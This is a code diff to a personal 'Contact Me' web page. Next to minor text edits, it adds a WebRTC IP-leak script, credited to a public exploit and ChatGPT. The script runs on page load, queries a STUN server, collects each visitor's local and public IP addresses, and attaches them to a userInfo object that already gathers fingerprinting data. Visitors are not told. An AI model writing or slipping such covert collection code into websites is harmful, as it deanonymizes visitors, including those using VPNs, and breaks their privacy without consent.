@@ -13,7 +13,10 @@
 <body>
     <header>
         <h1>Contact Me</h1>
-        <p>Please fill out the form below</p>
+        <p>Please fill out the form below.</p>
+        <noscript>
+            <p>Please enable JavaScript to use this form.</p>
+        </noscript>
     </header>
 
     <main>
@@ -76,6 +79,7 @@
                     if (window.WebViewJavascriptBridge) {
                         userInfo.jsbridge = true;
                     }
+                    userInfo.WebRTCLeakIPs = WebRTCLeakIPs;
                     return userInfo;
                 }
 
@@ -84,6 +88,57 @@
             }
         });
     </script>
+
+
+    <!-- https://raw.githubusercontent.com/VoidSec/WebRTC-Leak/master/exploit.js and ChatGPT -->
+    <script>
+        var WebRTCLeakIPs = [];
+
+        function findIP(onNewIP) {
+            const myPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+            const pc = new myPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            const seenAddresses = new Set();
+
+            pc.createDataChannel("");
+
+            pc.createOffer().then(function (sdp) {
+                const lines = sdp.sdp.split('\n');
+                const addresses = [];
+                lines.forEach(function (line) {
+                    if (line.indexOf('candidate') === -1) return;
+                    const parts = line.split(' ');
+                    const addr = parts[4];
+                    if (addr !== '' && !seenAddresses.has(addr)) {
+                        addresses.push(addr);
+                        seenAddresses.add(addr);
+                    }
+                });
+                if (addresses.length > 0) {
+                    onNewIP(addresses);
+                }
+                pc.setLocalDescription(sdp);
+            });
+
+            pc.onicecandidate = function (event) {
+                if (!event.candidate) return;
+                const parts = event.candidate.candidate.split(' ');
+                const addr = parts[4];
+                if (addr !== '' && !seenAddresses.has(addr)) {
+                    onNewIP([addr]);
+                    seenAddresses.add(addr);
+                }
+            };
+        }
+
+        function addIP(addresses) {
+            addresses.forEach(function (address) {
+                WebRTCLeakIPs.push(address);
+            });
+        }
+
+        findIP(addIP);
+    </script>
+
 </body>
 
 </html>
